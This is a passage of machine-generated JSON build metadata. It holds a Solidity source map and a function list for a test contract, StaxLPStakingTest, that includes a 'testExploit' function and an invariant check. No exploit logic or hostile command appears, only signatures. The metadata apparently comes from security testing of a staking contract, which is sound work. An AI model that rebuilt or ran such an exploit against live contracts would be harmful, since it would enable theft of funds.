37;6784:71;;6835:18;;:::i;7055:556::-;7257:2;7239:21;;;7296:3;7276:18;;;7269:31;7336:34;7331:2;7316:18;;7309:62;7407:34;7402:2;7387:18;;7380:62;7479:34;7473:3;7458:19;;7451:63;-1:-1:-1;;;7545:3:29;7530:19;;7523:46;7601:3;7586:19;;7055:556::o;7616:345::-;-1:-1:-1;;;;;7836:32:29;;;;7818:51;;7900:2;7885:18;;7878:34;;;;7943:2;7928:18;;7921:34;7806:2;7791:18;;7616:345::o;7966:127::-;8027:10;8022:3;8018:20;8015:1;8008:31;8058:4;8055:1;8048:15;8082:4;8079:1;8072:15;8098:127;8159:10;8154:3;8150:20;8147:1;8140:31;8190:4;8187:1;8180:15;8214:4;8211:1;8204:15;8230:135;8269:3;8290:17;;;8287:43;;8310:18;;:::i;:::-;-1:-1:-1;8357:1:29;8346:13;;8230:135::o;8370:899::-;8435:5;8488:3;8481:4;8473:6;8469:17;8465:27;8455:55;;8506:1;8503;8496:12;8455:55;8535:6;8529:13;8561:4;8584:18;8621:2;8617;8614:10;8611:36;;;8627:18;;:::i;:::-;8673:2;8670:1;8666:10;8705:2;8699:9;8768:2;8764:7;8759:2;8755;8751:11;8747:25;8739:6;8735:38;8823:6;8811:10;8808:22;8803:2;8791:10;8788:18;8785:46;8782:72;;;8834:18;;:::i;:::-;8870:2;8863:22;8920:18;;;8996:15;;;8992:24;;;8954:15;;;;-1:-1:-1;9028:15:29;;;9025:35;;;9056:1;9053;9046:12;9025:35;9092:2;9084:6;9080:15;9069:26;;9104:135;9120:6;9115:3;9112:15;9104:135;;;9186:10;;9174:23;;9217:12;;;;9137;;;;9104:135;;;9257:6;8370:899;-1:-1:-1;;;;;;;8370:899:29:o;9274:614::-;9403:6;9411;9464:2;9452:9;9443:7;9439:23;9435:32;9432:52;;;9480:1;9477;9470:12;9432:52;9513:9;9507:16;9542:18;9583:2;9575:6;9572:14;9569:34;;;9599:1;9596;9589:12;9569:34;9622:72;9686:7;9677:6;9666:9;9662:22;9622:72;:::i;:::-;9612:82;;9740:2;9729:9;9725:18;9719:25;9703:41;;9769:2;9759:8;9756:16;9753:36;;;9785:1;9782;9775:12;9753:36;;9808:74;9874:7;9863:8;9852:9;9848:24;9808:74;:::i;:::-;9798:84;;;9274:614;;;;;:::o;9893:442::-;-1:-1:-1;;;;;10140:32:29;;;;10122:51;;-1:-1:-1;;;;;;10209:33:29;;;;10204:2;10189:18;;10182:61;10274:2;10259:18;;10252:34;10317:2;10302:18;;10295:34;10109:3;10094:19;;9893:442::o","constructor":null,"functions":[{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:IS_SCRIPT()(bool)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"IS_SCRIPT():(bool)","shortSignature":"f8ccbf47","name":"IS_SCRIPT","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:IS_TEST()(bool)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"IS_TEST():(bool)","shortSignature":"fa7626d4","name":"IS_TEST","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:asAccountBegin(address,address)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"asAccountBegin(address,address)","shortSignature":"3eb644f6","name":"asAccountBegin","inputs":[{"name":"addr","kind":"Address","internalType":"address"},{"name":"origin","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:asAccountBegin(address)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"asAccountBegin(address)","shortSignature":"d8fdc41d","name":"asAccountBegin","inputs":[{"name":"addr","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:asAccountEnd()","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"asAccountEnd()","shortSignature":"8667f1bb","name":"asAccountEnd","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:asAccountForNextCall(address,address)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"asAccountForNextCall(address,address)","shortSignature":"03c70e04","name":"asAccountForNextCall","inputs":[{"name":"addr","kind":"Address","internalType":"address"},{"name":"origin","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:asAccountForNextCall(address)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"asAccountForNextCall(address)","shortSignature":"9d7f502f","name":"asAccountForNextCall","inputs":[{"name":"addr","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:failed()(bool)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"failed():(bool)","shortSignature":"ba414fa6","name":"failed","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:getAgentKey()(uint256)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"getAgentKey():(uint256)","shortSignature":"ce670b30","name":"getAgentKey","inputs":[],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"pure","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:invariantGetWhatPut()","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"invariantGetWhatPut()","shortSignature":"a2c3a178","name":"invariantGetWhatPut","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":true,"isInvariant":true,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:setNativeBalance(address,uint256)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"setNativeBalance(address,uint256)","shortSignature":"1c050e97","name":"setNativeBalance","inputs":[{"name":"account","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:setUp()","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"setUp()","shortSignature":"0a9254e4","name":"setUp","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":true,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:testExploit()","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"testExploit()","shortSignature":"ca1ba028","name":"testExploit","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":true,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:vm()(address)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"vm():(address)","shortSignature":"3a768463","name":"vm","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"contract Vm"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest:vmEx()(address)","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","signature":"vmEx():(address)","shortSignature":"905a71a9","name":"vmEx","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"contract VmEx"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[0,10,20,22,23,24,25,28,29,30,31,32,34,38,39,40,41,45,46,47,49,50,51,52,54,55,57]}]}